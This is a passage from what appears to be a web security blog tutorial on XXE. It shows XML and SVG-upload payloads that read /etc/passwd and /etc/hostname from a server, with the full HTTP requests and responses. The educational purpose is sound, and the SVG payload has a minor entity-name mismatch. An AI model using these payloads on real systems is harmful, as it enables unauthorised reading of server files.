+<span style="color:#75715e">&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;</span>
+<span style="color:#75715e">&lt;!DOCTYPE xxe [ &lt;!ENTITY file SYSTEM &#34;file:///etc/passwd&#34;&gt;</span> ]&gt;
+<span style="color:#f92672">&lt;post&gt;</span>
+	<span style="color:#f92672">&lt;postID&gt;</span>&amp;file;<span style="color:#f92672">&lt;/postID&gt;</span>
+<span style="color:#f92672">&lt;/post&gt;</span>
+</code></pre></div><p>The response:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-http" data-lang="http"><span style="color:#66d9ef">HTTP</span><span style="color:#f92672">/</span><span style="color:#ae81ff">1.1</span> <span style="color:#ae81ff">400</span> <span style="color:#a6e22e">Bad Request</span>
+Content-Type<span style="color:#f92672">:</span> <span style="color:#ae81ff">application/json; charset=utf-8</span>
+Connection<span style="color:#f92672">:</span> <span style="color:#ae81ff">close</span>
+
+<span style="color:#e6db74">&#34;Error: Invalid post ID: rootːx:0:0:root:/root:/usr/bin/zsh
+</span><span style="color:#e6db74">daemonːx:1:1:daemon:/usr/sbin:/usr/sbin/nologin 
+</span><span style="color:#e6db74">binːx:2:2:bin:/bin:/usr/sbin/nologin    
+</span><span style="color:#e6db74">sysːx:3:3:sys:/dev:/usr/sbin/nologin  
+</span><span style="color:#e6db74">syncːx:4:65534:sync:/bin:/bin/sync   
+</span><span style="color:#e6db74">gamesːx:5:60:games:/usr/games:/usr/sbin/nologin  
+</span><span style="color:#e6db74">man:ːx:6:12ːman:/var/cache/man:/usr/sbin/nologin 
+</span><span style="color:#e6db74">lpːx:7:7:lp:/var/spool/lpd:/usr/sbin/nologin  
+</span><span style="color:#e6db74">mailːx:8:8:mail:/var/mail:/usr/sbin/nologin  
+</span><span style="color:#e6db74">newsːx:9:9:news:/var/spool/news:/usr/sbin/nologin
+</span><span style="color:#e6db74">&#34;</span>
+</code></pre></div><h1 id="reading-files-using-file-upload-functionality">Reading files using file upload functionality<a hidden class="anchor" aria-hidden="true" href="#reading-files-using-file-upload-functionality">#</a></h1>
+<p>In this case, the web application parses the user-uploaded file and sets it as a profile picture. The application expects JPEG or PNG file but does not exclude <em>SVG</em> file type which contains actual XML data. Here we can try to embed our entity.</p>
+<p>Consider <code>/profile/uploadProfilePicture</code> endpoint:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-http" data-lang="http"><span style="color:#a6e22e">POST</span> /profile/uploadProfilePicture <span style="color:#66d9ef">HTTP</span><span style="color:#f92672">/</span><span style="color:#ae81ff">1.1</span>
+Host<span style="color:#f92672">:</span> <span style="color:#ae81ff">localhost</span>
+Cookie<span style="color:#f92672">:</span> <span style="color:#ae81ff">session=NGw5gXXbl1O0yRs8ASxAHZ9Xab46Cuol</span>
+Content-Type<span style="color:#f92672">:</span> <span style="color:#ae81ff">multipart/form-data; boundary=----WebKitFormBoundaryGHJEwyDDxcNQ6BJ7</span>
+User-Agent<span style="color:#f92672">:</span> <span style="color:#ae81ff">Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36</span>
+
+------WebKitFormBoundaryGHJEwyDDxcNQ6BJ7
+Content-Disposition: form-data; name=&#34;profilePicture&#34;; filename=&#34;picture.png&#34;
+Content-Type: image/png
+
+PNG
+
+
+</code></pre></div><p>We can change couple of things here:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-http" data-lang="http"><span style="color:#a6e22e">POST</span> /profile/uploadProfilePicture <span style="color:#66d9ef">HTTP</span><span style="color:#f92672">/</span><span style="color:#ae81ff">1.1</span>
+Host<span style="color:#f92672">:</span> <span style="color:#ae81ff">localhost</span>
+Cookie<span style="color:#f92672">:</span> <span style="color:#ae81ff">session=NGw5gXXbl1O0yRs8ASxAHZ9Xab46Cuol</span>
+Content-Type<span style="color:#f92672">:</span> <span style="color:#ae81ff">multipart/form-data; boundary=----WebKitFormBoundaryGHJEwyDDxcNQ6BJ7</span>
+User-Agent<span style="color:#f92672">:</span> <span style="color:#ae81ff">Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36</span>
+
+------WebKitFormBoundaryGHJEwyDDxcNQ6BJ7
+Content-Disposition: form-data; name=&#34;profilePicture&#34;; filename=&#34;picture.svg&#34;
+Content-Type: application/xml
+
+&lt;?xml version=&#34;1.0&#34; standalone=&#34;yes&#34;?&gt;
+&lt;!DOCTYPE image [ &lt;!ENTITY file SYSTEM &#34;file:///etc/hostname&#34; &gt; ]&gt;
+&lt;svg width=&#34;200px&#34; height=&#34;200px&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34; xmlns:xlink=&#34;http://www.w3.org/1999/xlink&#34; version=&#34;1.1&#34;&gt;&lt;text font-size=&#34;16&#34; x=&#34;0&#34; y=&#34;16&#34;&gt;&amp;xxe;&lt;/text&gt;&lt;/svg&gt;
+</code></pre></div><p>I changed:</p>
+<ul>
+<li><code>Content-Type</code> HTTP header to <code>application/xml</code></li>
+<li><code>filename</code> parameter value to <code>image.svg</code></li>
+</ul>
+<p>After sending the request, I got the following response:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-http" data-lang="http"><span style="color:#66d9ef">HTTP</span><span style="color:#f92672">/</span><span style="color:#ae81ff">1.1</span> <span style="color:#ae81ff">302</span> <span style="color:#a6e22e">Found</span>
+Location<span style="color:#f92672">:</span> <span style="color:#ae81ff">/profile</span>
+Connection<span style="color:#f92672">:</span> <span style="color:#ae81ff">close</span>
+Content-Length<span style="color:#f92672">:</span> <span style="color:#ae81ff">0</span>
+
+</code></pre></div><p>The response doesn&rsquo;t contain content of <code>/etc/hostname</code>? No problem. The XML parser didn&rsquo;t reflect it in response, but in the image itself, because that&rsquo;s how SVG and XML work.</p>
+<p>Downloading the image from <code>http://localhost/files/profilePictures/fhfbahasfiafs.png</code>:</p>
+<p><img loading="lazy" src="https://raw.githubusercontent.com/lazarpostenje/lazarpostenje.github.io/master/assets/profilePicture.png#center" alt=""  />
+</p>
+<p>As you can see, the hostname <code>ubuntu</code> is written on the PNG itself.</p>
+<hr>
+<h1 id="blind-xxe">Blind XXE<a hidden class="anchor" aria-hidden="true" href="#blind-xxe">#</a></h1>
+<p>As this post is already quite long, I&rsquo;ll write about blind XXE techniques next week, where we&rsquo;ll cover more advanced Out-Of-Band (<em>OOB</em>) content extraction and Application-level Denial Of Service.</p>
+
 
   </div>
   <footer class="post-footer">
